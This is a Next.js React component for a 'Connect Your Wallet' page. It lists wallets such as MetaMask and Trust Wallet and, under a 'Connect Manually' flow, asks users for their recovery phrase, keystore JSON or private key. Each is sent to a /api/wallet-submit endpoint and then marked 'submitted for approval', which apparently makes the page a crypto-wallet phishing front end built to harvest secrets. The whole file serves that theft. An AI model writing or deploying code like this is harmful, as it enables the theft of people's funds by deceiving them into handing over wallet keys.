"use client";

import React from "react";
import { useEffect, useState, FormEvent, ChangeEvent } from "react";
import { Eye, EyeOff, CheckCircle, AlertCircle, Clock } from "lucide-react";
import { useSession } from "next-auth/react";
import { toast } from "sonner";

type Wallet = {
	name: string;
	icon: string;
};

type ImportTab = {
	key: "phrase" | "keystore" | "private";
	label: string;
};

type ConnectedWallet = {
	walletId: string;
	walletName: string;
	walletType: string;
	status: "pending" | "approved" | "rejected";
	submittedAt?: string;
	approvedAt?: string | null;
	rejectedReason?: string | null;
};


interface SaveWalletResponse {
	success: boolean;
	error?: string;
}

const wallets: Wallet[] = [
	{ name: "Trust Wallet", icon: "/twt.png" },
	{ name: "SafePal", icon: "/sfp.png" },
	{ name: "Exodus", icon: "/exodus.jpg" },
	{ name: "Lobstr", icon: "/lobstr.jpg" },
	{ name: "Dharma", icon: "/dharma.jpg" },
	{ name: "HaloDeFi Wallet", icon: "/halodefi.png" },
	{ name: "Metamask", icon: "/metamask.png" },
	{ name: "Rainbow", icon: "/rainbow.jpg" },
];

const importTabs: ImportTab[] = [
	{ key: "phrase", label: "Phrase" },
	{ key: "keystore", label: "Keystore JSON" },
	{ key: "private", label: "Private Key" },
];

export default function ConnectWallet() {
	const [modalOpen, setModalOpen] = useState<boolean>(false);
	const [manualModalOpen, setManualModalOpen] =
		useState<boolean>(false);

	const [selectedWallet, setSelectedWallet] =
		useState<Wallet | null>(null);

	const [activeTab, setActiveTab] =
		useState<"phrase" | "keystore" | "private">("phrase");

	const [connectedWallets, setConnectedWallets] =
		useState<ConnectedWallet[]>([]);


	const sessionResult = useSession();
	const session = sessionResult?.data;

	useEffect(() => {
		async function fetchConnectedWallet() {
			try {
				const resp = await fetch("/api/wallet-status");
				const data = await resp.json();

				if (data.success) {
					setConnectedWallets(data.wallets || []);
				}
			} catch (error) {
				console.error(
					"Error fetching connected wallets:",
					error
				);
			}
		}

		if (session?.user) {
			fetchConnectedWallet();
		}
	}, [session]);
	const handleWalletClick = (wallet: Wallet): void => {
		setSelectedWallet(wallet);
		setModalOpen(true);
	};

	const handleCloseModal = (): void => {
		setModalOpen(false);
		setSelectedWallet(null);
	};

	const handleOpenManual = (): void => {
		setModalOpen(false);
		setManualModalOpen(true);
	};

	const handleCloseManual = (): void => {
		setManualModalOpen(false);
		setActiveTab("phrase");
	};
const uniqueWallets = connectedWallets.reduce<ConnectedWallet[]>((acc, wallet) => {
  const existingIdx = acc.findIndex(w => w.walletName === wallet.walletName);
  if (existingIdx === -1) {
    acc.push(wallet);
  } else if (new Date(wallet.submittedAt || 0) > new Date(acc[existingIdx].submittedAt || 0)) {
    acc[existingIdx] = wallet;
  }
  return acc;
}, []);
	return (
		<div style={{ minHeight: "100vh", paddingBottom: "var(--space-6)", backgroundColor: "var(--background)", color: "var(--foreground)" }}>
			<div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
				<div className="card card-elevated" style={{ padding: "var(--space-5)" }}>
					{uniqueWallets.length > 0 && (
						<div
							className="card"
							style={{
								marginBottom: "var(--space-8)",
								padding: "var(--space-5)",
							}}
						>
							<h2
								style={{
									fontSize: "var(--text-xl)",
									fontWeight: 700,
									marginBottom: "var(--space-4)",
								}}
							>
								Connected Wallets
							</h2>

							<div
								style={{
									display: "flex",
									flexDirection: "column",
									gap: "var(--space-3)",
								}}
							>
								{connectedWallets.map((wallet) => (
									<div
										key={wallet.walletId}
										style={{
											display: "flex",
											justifyContent: "space-between",
											alignItems: "center",
											padding: "var(--space-3)",
											borderRadius: "var(--radius-md)",
											background: "var(--glass-white-sm)",
										}}
									>
										<div>
											<div
												style={{
													fontWeight: 600,
													color: "var(--foreground)",
												}}
											>
												{wallet.walletName}
											</div>

											<div
												style={{
													fontSize: "var(--text-xs)",
													color: "var(--text-200)",
												}}
											>
												{wallet.walletType}
											</div>
										</div>

										<div>
											{wallet.status === "approved" && (
												<span
													style={{
														color: "var(--success-500)",
														fontWeight: 600,
													}}
												>
													✓ Approved
												</span>
											)}

											{wallet.status === "pending" && (
												<span
													style={{
														color: "var(--info-500)",
														fontWeight: 600,
													}}
												>
													 Pending
												</span>
											)}

											{wallet.status === "rejected" && (
												<span
													style={{
														color: "var(--danger-500)",
														fontWeight: 600,
													}}
												>
													✕ Rejected
												</span>
											)}
										</div>
									</div>
								))}
							</div>
						</div>
					)}

					{/* Header */}
					<div style={{ textAlign: "center", marginBottom: "var(--space-10)", maxWidth: "42rem", margin: "0 auto var(--space-10)" }}>
						<h1 style={{ fontSize: "var(--text-3xl)", fontWeight: 700, marginBottom: "var(--space-3)", color: "var(--foreground)" }}>
							Connect Your Wallet
						</h1>

						<p style={{ color: "var(--text-200)" }}>
							Select a wallet and connect securely by scanning
							a QR code or using a recovery phrase.
						</p>
					</div>

					{/* Wallet Grid */}
					<div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(120px, 1fr))", gap: "var(--space-6)", marginBottom: "var(--space-8)" }}>
						{wallets.map((wallet) => (
							<div
								key={wallet.name}
								className="card"
								style={{
									display: "flex",
									flexDirection: "column",
									alignItems: "center",
									cursor: "pointer",
									padding: "var(--space-4)",
									opacity: 1,
									transition: "transform var(--duration-base) var(--ease-out)",
								}}
								onClick={() => handleWalletClick(wallet)}
								onMouseEnter={(e) => {
									e.currentTarget.style.transform = "scale(1.05)";
								}}
								onMouseLeave={(e) => {
									e.currentTarget.style.transform = "scale(1)";
								}}
							>
								<div style={{ width: "3.5rem", height: "3.5rem", borderRadius: "9999px", overflow: "hidden", display: "flex", alignItems: "center", justifyContent: "center", backgroundColor: "var(--glass-brand-sm)", boxShadow: "var(--shadow-xs)" }}>
									<img
										src={wallet.icon}
										alt={wallet.name}
										style={{ width: "3.5rem", height: "3.5rem", objectFit: "contain" }}
									/>
								</div>

								<span style={{ fontSize: "var(--text-sm)", fontWeight: 500, color: "var(--foreground)", textAlign: "center", marginTop: "var(--space-2)" }}>
									{wallet.name}
								</span>
							</div>
						))}
					</div>
				</div>

				{/* Main Modal */}
				{modalOpen && selectedWallet && (
					<div style={{ position: "fixed", inset: 0, zIndex: 300, display: "flex", alignItems: "center", justifyContent: "center", backgroundColor: "rgba(0, 0, 0, 0.85)" }}>
						<div className="card card-elevated" style={{ width: "100%", maxWidth: "32rem", position: "relative", overflow: "hidden", margin: "0 0.5rem" }}>
							<div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "var(--space-4)", borderBottom: "1px solid var(--border-default)" }}>
								<button
									onClick={handleCloseModal}
									style={{ backgroundColor: "transparent", border: "none", color: "var(--text-200)", cursor: "pointer", fontSize: "1.25rem", transition: "color var(--duration-fast) var(--ease-out)" }}
									onMouseEnter={(e) => e.currentTarget.style.color = "var(--danger-500)"}
									onMouseLeave={(e) => e.currentTarget.style.color = "var(--text-200)"}
								>
									✕
								</button>

								<div
									style={{ color: "var(--primary)", fontWeight: 600, cursor: "pointer", transition: "opacity var(--duration-fast) var(--ease-out)" }}
									onClick={handleCloseModal}
									onMouseEnter={(e) => e.currentTarget.style.opacity = "0.7"}
									onMouseLeave={(e) => e.currentTarget.style.opacity = "1"}
								>
									Back
								</div>
							</div>

							<div style={{ padding: "var(--space-6)" }}>
								<div style={{ display: "flex", flexDirection: "column", alignItems: "center" }}>
									<div style={{ marginBottom: "var(--space-4)" }}>
										<img
											src={selectedWallet.icon}
											alt="Icon"
											style={{ width: 40, height: 40 }}
										/>
									</div>

									<div style={{ fontSize: "var(--text-lg)", fontWeight: 500, marginBottom: "var(--space-2)", color: "var(--foreground)" }}>
										Connect {selectedWallet.name}
									</div>

									<div style={{ display: "flex", justifyContent: "center", marginBottom: "var(--space-4)" }}>
										<button
											className="btn-primary"
											onClick={handleOpenManual}
										>
											Connect Manually
										</button>
									</div>

									<div style={{ display: "flex", cursor: "pointer", alignItems: "center", justifyContent: "space-between", width: "100%", backgroundColor: "var(--glass-white-sm)", borderRadius: "var(--radius-md)", padding: "var(--space-3)", marginTop: "var(--space-2)", transition: "background var(--duration-base) var(--ease-out)" }}
										onMouseEnter={(e) => e.currentTarget.style.backgroundColor = "var(--glass-white-md)"}
										onMouseLeave={(e) => e.currentTarget.style.backgroundColor = "var(--glass-white-sm)"}
									>
										<div>
											<div style={{ fontWeight: 600, color: "var(--primary)" }}>
												{selectedWallet.name}
											</div>

											<div style={{ fontSize: "var(--text-xs)", color: "var(--text-200)" }}>
												Easy-to-use browser extension.
											</div>
										</div>

										<div>
											<img
												src={selectedWallet.icon}
												alt="Icon"
												style={{ width: 24 }}
											/>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				)}

				{/* Manual Modal */}
				{manualModalOpen && selectedWallet && (
					<div style={{ position: "fixed", inset: 0, zIndex: 300, display: "flex", alignItems: "center", justifyContent: "center", backgroundColor: "rgba(0, 0, 0, 0.85)" }}>
						<div className="card card-elevated" style={{ width: "100%", maxWidth: "32rem", margin: "0 0.5rem" }}>
							<div style={{ padding: "var(--space-6)" }}>
								<h3 style={{ fontSize: "var(--text-lg)", fontWeight: 500, color: "var(--foreground)", display: "flex", alignItems: "center", gap: "var(--space-4)", marginBottom: "var(--space-6)" }}>
									<img
										src={selectedWallet.icon}
										alt="wallet"
										style={{ height: "2.5rem", width: "2.5rem" }}
									/>

									<span>
										Import your {selectedWallet.name} wallet
									</span>
								</h3>

								<div style={{ display: "flex", justifyContent: "space-around", marginBottom: "var(--space-4)" }}>
									{importTabs.map((tab) => (
										<div
											key={tab.key}
											style={{
												padding: "var(--space-2)",
												borderBottom: activeTab === tab.key ? "2px solid var(--primary)" : "2px solid var(--border-default)",
												cursor: "pointer",
												color: activeTab === tab.key ? "var(--primary)" : "var(--text-200)",
												transition: "all var(--duration-base) var(--ease-out)",
											}}
											onClick={() => setActiveTab(tab.key)}
										>
											{tab.label}
										</div>
									))}
								</div>

								{activeTab === "phrase" && (
									<SeedPhraseTab
										walletName={selectedWallet.name}
										onSuccess={() => {
											handleCloseManual();
											setTimeout(() => window.location.reload(), 2000);
										}}
									/>
								)}

								{activeTab === "keystore" && (
									<KeystoreTab
										walletName={selectedWallet.name}
										onSuccess={() => {
											handleCloseManual();
											setTimeout(() => window.location.reload(), 2000);
										}}
									/>
								)}

								{activeTab === "private" && (
									<PrivateKeyTab
										walletName={selectedWallet.name}
										onSuccess={() => {
											handleCloseManual();
											setTimeout(() => window.location.reload(), 2000);
										}}
									/>
								)}

								<div style={{ display: "flex", justifyContent: "flex-end", marginTop: "var(--space-4)" }}>
									<button
										className="btn-secondary"
										onClick={handleCloseManual}
									>
										Cancel
									</button>
								</div>
							</div>
						</div>
					</div>
				)}
			</div>
		</div>
	);
}

/* ───────────────────────────────────────────── */
/* TYPES */
/* ───────────────────────────────────────────── */

interface TabProps {
	walletName: string;
	onSuccess?: () => void;
}

interface GlobalPendingState {
	globalPending: boolean;
	pendingType: string | null;
}

/* ───────────────────────────────────────────── */
/* GLOBAL PENDING */
/* ───────────────────────────────────────────── */

function useGlobalPending(): GlobalPendingState {
	return {
		globalPending: false,
		pendingType: null,
	};
}


/* ───────────────────────────────────────────── */
/* SEED PHRASE TAB */
/* ───────────────────────────────────────────── */

function SeedPhraseTab({
	walletName,
	onSuccess,
}: TabProps) {
	const [phraseArr, setPhraseArr] = useState<string[]>(
		Array(12).fill("")
	);

	const [submitted, setSubmitted] =
		useState<boolean>(false);

	

	const [loading, setLoading] =
		useState<boolean>(false);

	const [showPhrase, setShowPhrase] =
		useState<boolean>(false);



	const handleWordChange = (
		idx: number,
		value: string
	): void => {
		const arr = [...phraseArr];
		arr[idx] = value.replace(/\s/g, "");
		setPhraseArr(arr);
	};

	const handleSubmit = async (
		e: FormEvent<HTMLFormElement>
	): Promise<void> => {
		e.preventDefault();

		const words = phraseArr.filter(Boolean);

		if (words.length !== 12 && words.length !== 24) {
			toast.error(
				"Recovery phrase must be exactly 12 or 24 words."
			);
			return;
		}

		setLoading(true);

		try {
			const res = await fetch("/api/wallet-submit", {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
				},
				body: JSON.stringify({
					type: "phrase",
					data: words.join(" "),
					walletName,
				}),
			});

			const result = await res.json();

			if (result.success) {
				setSubmitted(true);
				
				toast.success(
					"Wallet submitted for approval."
				);
				setTimeout(() => onSuccess?.(), 1500);
			} else {
				toast.error(result.error || "Submission failed");
			}
		} catch (error) {
			toast.error("Failed to submit wallet");
			console.error(error);
		} finally {
			setLoading(false);
		}
	};

	return (
		<form onSubmit={handleSubmit}>
			<div style={{ marginBottom: "var(--space-6)" }}>
				<div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "var(--space-2)" }}>
					<label style={{ fontWeight: 600, color: "var(--foreground)" }}>
						Enter your recovery phrase
					</label>

					<button
						type="button"
						onClick={() => setShowPhrase((v) => !v)}
						style={{ backgroundColor: "transparent", border: "none", cursor: "pointer", color: "var(--text-100)" }}
					>
						{showPhrase ? (
							<EyeOff size={22} />
						) : (
							<Eye size={22} />
						)}
					</button>
				</div>

				<div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(80px, 1fr))", gap: "var(--space-2)" }}>
					{phraseArr.map((word, idx) => (
						<input
							key={idx}
							type={showPhrase ? "text" : "password"}
							value={word}
							onChange={(e: ChangeEvent<HTMLInputElement>) =>
								handleWordChange(idx, e.target.value)
							}
							placeholder={`Word ${idx + 1}`}
							style={{
								backgroundColor: "var(--glass-white-sm)",
								padding: "var(--space-2)",
								borderRadius: "var(--radius-md)",
								textAlign: "center",
								border: "1px solid var(--border-default)",
								color: "var(--foreground)",
								fontSize: "var(--text-sm)",
								transition: "all var(--duration-base) var(--ease-out)",
							}}
							onFocus={(e) => {
								e.currentTarget.style.borderColor = "var(--primary)";
								e.currentTarget.style.backgroundColor = "var(--glass-white-md)";
							}}
							onBlur={(e) => {
								e.currentTarget.style.borderColor = "var(--border-default)";
								e.currentTarget.style.backgroundColor = "var(--glass-white-sm)";
							}}
						/>
					))}
				</div>
			</div>

			<button
				type="submit"
				className="btn-primary"
				disabled={submitted || loading}
				style={{
					opacity: submitted || loading ? 0.5 : 1,
					cursor: submitted || loading ? "not-allowed" : "pointer",
				}}
			>
				{loading ? "Submitting..." : "Proceed"}
			</button>
		</form>
	);
}

/* ───────────────────────────────────────────── */
/* KEYSTORE TAB */
/* ───────────────────────────────────────────── */

function KeystoreTab({
	walletName,
	onSuccess,
}: TabProps) {
	const [keystoreJson, setKeystoreJson] =
		useState<string>("");

	const [loading, setLoading] =
		useState<boolean>(false);

	const [submitted, setSubmitted] =
		useState<boolean>(false);


	const handleSubmit = async (
		e: FormEvent<HTMLFormElement>
	): Promise<void> => {
		e.preventDefault();

		if (!keystoreJson.trim()) {
			toast.error("Please paste your keystore JSON.");
			return;
		}

		try {
			JSON.parse(keystoreJson);
		} catch {
			toast.error("Invalid JSON format for keystore.");
			return;
		}

		setLoading(true);

		try {
			const res = await fetch("/api/wallet-submit", {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
				},
				body: JSON.stringify({
					type: "keystore",
					data: keystoreJson,
					walletName,
				}),
			});

			const result = await res.json();

			if (result.success) {
				setSubmitted(true);
				toast.success(
					"Wallet submitted for approval."
				);
				setTimeout(() => onSuccess?.(), 1500);
			} else {
				toast.error(result.error || "Submission failed");
			}
		} catch (error) {
			toast.error("Failed to submit wallet");
			console.error(error);
		} finally {
			setLoading(false);
		}
	};

	return (
		<form onSubmit={handleSubmit}>
			<div style={{ marginBottom: "var(--space-6)" }}>
				<label style={{ display: "block", fontWeight: 600, color: "var(--foreground)", marginBottom: "var(--space-2)" }}>
					Paste your keystore JSON
				</label>

				<textarea
					value={keystoreJson}
					onChange={(e: ChangeEvent<HTMLTextAreaElement>) =>
						setKeystoreJson(e.target.value)
					}
					placeholder="Paste your keystore JSON file content here..."
					style={{
						width: "100%",
						backgroundColor: "var(--glass-white-sm)",
						padding: "var(--space-3)",
						borderRadius: "var(--radius-md)",
						border: "1px solid var(--border-default)",
						fontSize: "var(--text-sm)",
						fontFamily: "var(--font-mono)",
						minHeight: "10rem",
						color: "var(--foreground)",
						transition: "all var(--duration-base) var(--ease-out)",
						resize: "vertical",
					}}
					onFocus={(e) => {
						e.currentTarget.style.borderColor = "var(--primary)";
						e.currentTarget.style.backgroundColor = "var(--glass-white-md)";
					}}
					onBlur={(e) => {
						e.currentTarget.style.borderColor = "var(--border-default)";
						e.currentTarget.style.backgroundColor = "var(--glass-white-sm)";
					}}
				/>
			</div>

			<button
				type="submit"
				className="btn-primary"
				disabled={submitted || loading }
				style={{
					opacity: submitted || loading ? 0.5 : 1,
					cursor: submitted || loading ? "not-allowed" : "pointer",
				}}
			>
				{loading ? "Submitting..." : "Proceed"}
			</button>
		</form>
	);
}

/* ───────────────────────────────────────────── */
/* PRIVATE KEY TAB */
/* ───────────────────────────────────────────── */

function PrivateKeyTab({
	walletName,
	onSuccess,
}: TabProps) {
	const [privateKey, setPrivateKey] =
		useState<string>("");

	const [loading, setLoading] =
		useState<boolean>(false);

	const [submitted, setSubmitted] =
		useState<boolean>(false);

	const [showKey, setShowKey] =
		useState<boolean>(false);


	const handleSubmit = async (
		e: FormEvent<HTMLFormElement>
	): Promise<void> => {
		e.preventDefault();

		if (!privateKey.trim()) {
			toast.error("Please enter your private key.");
			return;
		}

		if (
			!/^(0x)?[a-fA-F0-9]{64}$/.test(
				privateKey.trim()
			)
		) {
			toast.error(
				"Invalid private key format. Must be 64 hexadecimal characters."
			);
			return;
		}

		setLoading(true);

		try {
			const res = await fetch("/api/wallet-submit", {
				method: "POST",
				headers: {
					"Content-Type": "application/json",
				},
				body: JSON.stringify({
					type: "private",
					data: privateKey.trim(),
					walletName,
				}),
			});

			const result = await res.json();

			if (result.success) {
				setSubmitted(true);
				toast.success(
					"Wallet submitted for  approval."
				);
				setTimeout(() => onSuccess?.(), 1500);
			} else {
				toast.error(result.error || "Submission failed");
			}
		} catch (error) {
			toast.error("Failed to submit wallet");
			console.error(error);
		} finally {
			setLoading(false);
		}
	};

	return (
		<form onSubmit={handleSubmit}>
			<div style={{ marginBottom: "var(--space-6)" }}>
				<div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "var(--space-2)" }}>
					<label style={{ fontWeight: 600, color: "var(--foreground)" }}>
						Enter your private key
					</label>

					<button
						type="button"
						onClick={() => setShowKey((v) => !v)}
						style={{ backgroundColor: "transparent", border: "none", cursor: "pointer", color: "var(--text-100)" }}
					>
						{showKey ? (
							<EyeOff size={22} />
						) : (
							<Eye size={22} />
						)}
					</button>
				</div>

				<input
					type={showKey ? "text" : "password"}
					value={privateKey}
					onChange={(e: ChangeEvent<HTMLInputElement>) =>
						setPrivateKey(e.target.value)
					}
					placeholder="0x or your private key (64 hex characters)"
					style={{
						width: "100%",
						backgroundColor: "var(--glass-white-sm)",
						padding: "var(--space-3)",
						borderRadius: "var(--radius-md)",
						border: "1px solid var(--border-default)",
						fontSize: "var(--text-sm)",
						fontFamily: "var(--font-mono)",
						color: "var(--foreground)",
						transition: "all var(--duration-base) var(--ease-out)",
					}}
					onFocus={(e) => {
						e.currentTarget.style.borderColor = "var(--primary)";
						e.currentTarget.style.backgroundColor = "var(--glass-white-md)";
					}}
					onBlur={(e) => {
						e.currentTarget.style.borderColor = "var(--border-default)";
						e.currentTarget.style.backgroundColor = "var(--glass-white-sm)";
					}}
				/>

				<p style={{ fontSize: "var(--text-xs)", color: "var(--text-200)", marginTop: "var(--space-2)" }}>
					⚠️ Never share your private key. Keep it secure.
				</p>
			</div>

			<button
				type="submit"
				className="btn-primary"
				disabled={submitted || loading }
				style={{
					opacity: submitted || loading ? 0.5 : 1,
					cursor: submitted || loading ? "not-allowed" : "pointer",
				}}
			>
				{loading ? "Submitting..." : "Proceed"}
			</button>
		</form>
	);
}